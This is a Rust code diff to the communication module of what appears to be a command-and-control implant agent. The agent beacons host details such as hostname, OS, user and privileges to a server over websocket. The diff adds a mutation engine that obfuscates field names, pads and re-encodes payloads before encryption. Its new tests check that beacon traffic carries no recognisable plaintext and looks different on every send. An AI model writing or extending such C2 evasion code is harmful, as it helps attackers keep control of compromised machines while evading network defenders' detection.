@@ -7,6 +7,7 @@ use std::time::SystemTime;
 use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};
 
 use crate::crypto::{CryptoManager, KeyExchangePayload};
+use crate::mutation::MutationEngine;
 
 #[derive(Debug, Serialize, Deserialize, Clone)]
 pub struct Message {
@@ -53,6 +54,7 @@ pub struct Communicator {
     max_reconnect_attempts: u32,
     beacon_interval: u64,
     crypto: Arc<RwLock<CryptoManager>>,
+    mutation: Arc<RwLock<MutationEngine>>,
     session_established: Arc<RwLock<bool>>,
 }
 
@@ -63,6 +65,7 @@ impl Communicator {
         agent_id: &str,
         beacon_interval: u64,
         crypto: CryptoManager,
+        mutation_seed: &[u8; 32],
     ) -> Self {
         Self {
             url: url.to_string(),
@@ -73,6 +76,7 @@ impl Communicator {
             max_reconnect_attempts: 5,
             beacon_interval,
             crypto: Arc::new(RwLock::new(crypto)),
+            mutation: Arc::new(RwLock::new(MutationEngine::new(mutation_seed))),
             session_established: Arc::new(RwLock::new(false)),
         }
     }
@@ -157,9 +161,15 @@ impl Communicator {
     }
 
     async fn encrypt_payload(&self, plaintext: &[u8]) -> Result<EncryptedEnvelope, Box<dyn std::error::Error>> {
+        // Step 1: Mutate the JSON payload (obfuscate fields, add padding, rotate encoding)
+        let mut mutation = self.mutation.write().await;
+        let mutated = mutation.mutate(plaintext)?;
+        drop(mutation);
+
+        // Step 2: Encrypt the mutated payload
         let mut crypto = self.crypto.write().await;
         let idx = crypto.message_index();
-        let encrypted = crypto.encrypt(plaintext)?;
+        let encrypted = crypto.encrypt(&mutated)?;
 
         Ok(EncryptedEnvelope {
             v: 2,
@@ -173,9 +183,17 @@ impl Communicator {
             return Err(format!("Unsupported envelope version: {}", envelope.v).into());
         }
 
+        // Step 1: Decrypt
         let encrypted = BASE64.decode(&envelope.data)?;
         let mut crypto = self.crypto.write().await;
-        crypto.decrypt(&encrypted)
+        let mutated = crypto.decrypt(&encrypted)?;
+        drop(crypto);
+
+        // Step 2: Demutate (restore original field names, strip padding, decode)
+        let mut mutation = self.mutation.write().await;
+        let original = mutation.demutate(&mutated)?;
+
+        Ok(original)
     }
 
     pub async fn send_beacon(
@@ -279,7 +297,7 @@ mod tests {
     fn test_communicator_creation() {
         let key = [42u8; 32];
         let crypto = CryptoManager::new(&key).unwrap();
-        let comm = Communicator::new("localhost", 8000, "test-agent-id", 30, crypto);
+        let comm = Communicator::new("localhost", 8000, "test-agent-id", 30, crypto, &key);
         assert_eq!(comm.get_agent_id(), "test-agent-id");
         assert_eq!(comm.url, "localhost");
         assert_eq!(comm.port, 8000);
@@ -289,7 +307,7 @@ mod tests {
     fn test_websocket_url() {
         let key = [42u8; 32];
         let crypto = CryptoManager::new(&key).unwrap();
-        let comm = Communicator::new("example.com", 443, "agent-123", 30, crypto);
+        let comm = Communicator::new("example.com", 443, "agent-123", 30, crypto, &key);
         assert_eq!(comm.get_websocket_url(), "wss://example.com:443/ws/agent");
     }
 
@@ -297,7 +315,7 @@ mod tests {
     async fn test_sequence_increment() {
         let key = [42u8; 32];
         let crypto = CryptoManager::new(&key).unwrap();
-        let comm = Communicator::new("localhost", 8000, "agent-123", 30, crypto);
+        let comm = Communicator::new("localhost", 8000, "agent-123", 30, crypto, &key);
 
         let seq1 = comm.get_next_sequence().await;
         let seq2 = comm.get_next_sequence().await;
@@ -309,11 +327,11 @@ mod tests {
     }
 
     #[tokio::test]
-    async fn test_encrypted_beacon() {
+    async fn test_encrypted_mutated_beacon() {
         let key = [42u8; 32];
         let mut crypto = CryptoManager::new(&key).unwrap();
         crypto.init_with_psk().unwrap();
-        let comm = Communicator::new("localhost", 8000, "agent-123", 30, crypto);
+        let comm = Communicator::new("localhost", 8000, "agent-123", 30, crypto, &key);
 
         {
             let mut established = comm.session_established.write().await;
@@ -337,8 +355,41 @@ mod tests {
         assert_eq!(envelope.v, 2);
         assert!(!envelope.data.is_empty());
 
-        // Verify it's not plaintext
+        // Verify no plaintext leaks
         assert!(!result.contains("agent-123"));
         assert!(!result.contains("test-host"));
+        assert!(!result.contains("agent_id"));
+        assert!(!result.contains("hostname"));
+        assert!(!result.contains("BEACON"));
+    }
+
+    #[tokio::test]
+    async fn test_beacons_look_different_each_time() {
+        let key = [42u8; 32];
+        let mut crypto = CryptoManager::new(&key).unwrap();
+        crypto.init_with_psk().unwrap();
+        let comm = Communicator::new("localhost", 8000, "agent-123", 30, crypto, &key);
+
+        {
+            let mut established = comm.session_established.write().await;
+            *established = true;
+        }
+
+        let beacon = BeaconPayload {
+            agent_id: "agent-123".into(),
+            hostname: "test-host".into(),
+            os: "linux".into(),
+            os_version: "6.1".into(),
+            architecture: "x86_64".into(),
+            ip_address: None,
+            user: None,
+            privileges: None,
+        };
+
+        let r1 = comm.send_beacon(&beacon).await.unwrap();
+        let r2 = comm.send_beacon(&beacon).await.unwrap();
+
+        // Same payload but wire data must differ (different keys + different mutation)
+        assert_ne!(r1, r2);
     }
 }
